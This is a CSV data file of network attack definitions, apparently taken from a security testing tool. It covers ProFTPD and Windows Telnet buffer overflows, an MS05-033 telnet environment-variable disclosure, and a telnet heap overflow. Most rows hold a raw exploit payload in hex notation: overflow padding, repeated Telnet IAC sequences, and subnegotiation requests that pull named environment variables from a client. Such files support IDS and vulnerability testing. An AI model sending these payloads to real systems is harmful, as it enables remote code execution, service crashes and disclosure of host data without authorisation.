XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,220 FTP Server ready.[[0D 0A]]
﻿FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow_IPv6.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow (IPV6 VERSION),"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.","IPV6,FTP",TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[FF ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow_IPv6.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow (IPV6 VERSION),"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.","IPV6,FTP",TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow_IPv6.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow (IPV6 VERSION),"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.","IPV6,FTP",TCP,220 FTP Server ready.[[0D 0A]]
﻿TSL20150113-14_Microsoft_Windows_Telnet_Service_Buffer_Overflow.xml,Microsoft Windows Telnet Service Buffer Overflow,A buffer overflow vulnerability exists in Microsoft Windows Telnet service. The vulnerability is due to an input validation error in processing Telnet messages. A remote attacker can exploit this vulnerability by sending crafted Telnet messages to a vulnerable server. Successful exploitation could possibly results in arbitrary code execution in the security context of the &quot;Local Service&quot; account.  Tester should set variable $destPort to 23 before test.,Telnet,TCP,[[FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6]]
﻿TSL20150113-14_Microsoft_Windows_Telnet_Service_Buffer_Overflow_IPv6.xml,Microsoft Windows Telnet Service Buffer Overflow IPv6 version.,A buffer overflow vulnerability exists in Microsoft Windows Telnet service. The vulnerability is due to an input validation error in processing Telnet messages. A remote attacker can exploit this vulnerability by sending crafted Telnet messages to a vulnerable server. Successful exploitation could possibly results in arbitrary code execution in the security context of the &quot;Local Service&quot; account. Tester should set variable $destPort to 23 before test.,Telnet.IPV6,TCP,[[FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6]]
﻿ms05-033_telnet.xml,MS05-033 Windows Telnet Environment Variable Disclosure,This threat attempts to lift every environment variable available with Microsoft Windows XP via the telnet client.  The telnet client can caused to launch via a hyperlink embedded in a web page or through social engineering causing the user to launch it.  This can be used to learn about other potential vulnerabilities in the user's system.  Telnet typically listens on port 23.  This threat is a client attack that comes from the virtual server.,Telnet,TCP,"[[FF FD 03 FF FB 18 FF FB 1F FF FB ]] [[FF FB ]]![[FF FB ]]""[[FF FB ]]'[[FF FD 05 FF FB ]]#"
ms05-033_telnet.xml,MS05-033 Windows Telnet Environment Variable Disclosure,This threat attempts to lift every environment variable available with Microsoft Windows XP via the telnet client.  The telnet client can caused to launch via a hyperlink embedded in a web page or through social engineering causing the user to launch it.  This can be used to learn about other potential vulnerabilities in the user's system.  Telnet typically listens on port 23.  This threat is a client attack that comes from the virtual server.,Telnet,TCP,[[FF FA ]]'[[01 03 ]]USERPROFILE[[FF F0 FF FA ]]'[[01 03 ]]ALLUSERSPROFILE[[FF F0 FF FA ]]'[[01 03 ]]APPDATA[[FF F0 FF FA ]]'[[01 03 ]]CLIENTNAME[[FF F0 FF FA ]]'[[01 03 ]]CommonProgramFiles[[FF F0 FF FA ]]'[[01 03 ]]COMPUTERNAME[[FF F0 FF FA ]]'[[01 03 ]]ComSpec[[FF F0 FF FA ]]'[[01 03 ]]HOMEDRIVE[[FF F0 FF FA ]]'[[01 03 ]]HOMEPATH[[FF F0 FF FA ]]'[[01 03 ]]LOGONSERVER[[FF F0 FF FA ]]'[[01 03 ]]NUMBER_OF_PROCESSORS[[FF F0 FF FA ]]'[[01 03 ]]OS[[FF F0 FF FA ]]'[[01 03 ]]Path[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_ARCHITECTURE[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_IDENTIFIER[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_LEVEL[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_REVISION[[FF F0 FF FA ]]'[[01 03 ]]ProgramFiles[[FF F0 FF FA ]]'[[01 03 ]]PROMPT[[FF F0 FF FA ]]'[[01 03 ]]SESSIONNAME[[FF F0 FF FA ]]'[[01 03 ]]SystemDrive[[FF F0 FF FA ]]'[[01 03 ]]SystemRoot[[FF F0 FF FA ]]'[[01 03 ]]TEMP[[FF F0 FF FA ]]'[[01 03 ]]TMP[[FF F0 FF FA ]]'[[01 03 ]]USERDOMAIN[[FF F0 FF FA ]]'[[01 03 ]]windir[[FF F0]]
﻿ms05-033_telnet_IPv6.xml,MS05-033 Windows Telnet Environment Variable Disclosure (IPv6 Version),This threat attempts to lift every environment variable available with Microsoft Windows XP via the telnet client.  The telnet client can caused to launch via a hyperlink embedded in a web page or through social engineering causing the user to launch it.  This can be used to learn about other potential vulnerabilities in the user's system.  Telnet typically listens on port 23.  This threat is a client attack that comes from the virtual server. (IPv6 Version),Telnet/IPv6,TCP,"[[FF FD 03 FF FB 18 FF FB 1F FF FB ]] [[FF FB ]]![[FF FB ]]""[[FF FB ]]'[[FF FD 05 FF FB ]]#"
ms05-033_telnet_IPv6.xml,MS05-033 Windows Telnet Environment Variable Disclosure (IPv6 Version),This threat attempts to lift every environment variable available with Microsoft Windows XP via the telnet client.  The telnet client can caused to launch via a hyperlink embedded in a web page or through social engineering causing the user to launch it.  This can be used to learn about other potential vulnerabilities in the user's system.  Telnet typically listens on port 23.  This threat is a client attack that comes from the virtual server. (IPv6 Version),Telnet/IPv6,TCP,[[FF FA ]]'[[01 03 ]]USERPROFILE[[FF F0 FF FA ]]'[[01 03 ]]ALLUSERSPROFILE[[FF F0 FF FA ]]'[[01 03 ]]APPDATA[[FF F0 FF FA ]]'[[01 03 ]]CLIENTNAME[[FF F0 FF FA ]]'[[01 03 ]]CommonProgramFiles[[FF F0 FF FA ]]'[[01 03 ]]COMPUTERNAME[[FF F0 FF FA ]]'[[01 03 ]]ComSpec[[FF F0 FF FA ]]'[[01 03 ]]HOMEDRIVE[[FF F0 FF FA ]]'[[01 03 ]]HOMEPATH[[FF F0 FF FA ]]'[[01 03 ]]LOGONSERVER[[FF F0 FF FA ]]'[[01 03 ]]NUMBER_OF_PROCESSORS[[FF F0 FF FA ]]'[[01 03 ]]OS[[FF F0 FF FA ]]'[[01 03 ]]Path[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_ARCHITECTURE[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_IDENTIFIER[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_LEVEL[[FF F0 FF FA ]]'[[01 03 ]]PROCESSOR_REVISION[[FF F0 FF FA ]]'[[01 03 ]]ProgramFiles[[FF F0 FF FA ]]'[[01 03 ]]PROMPT[[FF F0 FF FA ]]'[[01 03 ]]SESSIONNAME[[FF F0 FF FA ]]'[[01 03 ]]SystemDrive[[FF F0 FF FA ]]'[[01 03 ]]SystemRoot[[FF F0 FF FA ]]'[[01 03 ]]TEMP[[FF F0 FF FA ]]'[[01 03 ]]TMP[[FF F0 FF FA ]]'[[01 03 ]]USERDOMAIN[[FF F0 FF FA ]]'[[01 03 ]]windir[[FF F0]]
﻿telnetHeap.xml,Telnet Heap Overflow Attack,This attack is a crash which can be potentially used to cause remote code execution on a host connecting with telnet.  This threat is a client attack that comes from the virtual server.,Telnet,TCP,"[[FF FD 03 FF FB 18 FF FB 1F FF FB ]] [[FF FB ]]![[FF FB ]]""[[FF FB ]]'[[FF FD 05 FF FB ]]#"
telnetHeap.xml,Telnet Heap Overflow Attack,This attack is a crash which can be potentially used to cause remote code execution on a host connecting with telnet.  This threat is a client attack that comes from the virtual server.,Telnet,TCP,"[[FF FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FA ]]""[[03 FF FF 03 03 FF F0]]"
﻿telnetHeap_IPv6.xml,Telnet Heap Overflow Attack (IPv6 Version),This attack is a crash which can be potentially used to cause remote code execution on a host connecting with telnet.  This threat is a client attack that comes from the virtual server. (IPv6 Version),Telnet/IPv6,TCP,"[[FF FD 03 FF FB 18 FF FB 1F FF FB ]] [[FF FB ]]![[FF FB ]]""[[FF FB ]]'[[FF FD 05 FF FB ]]#"
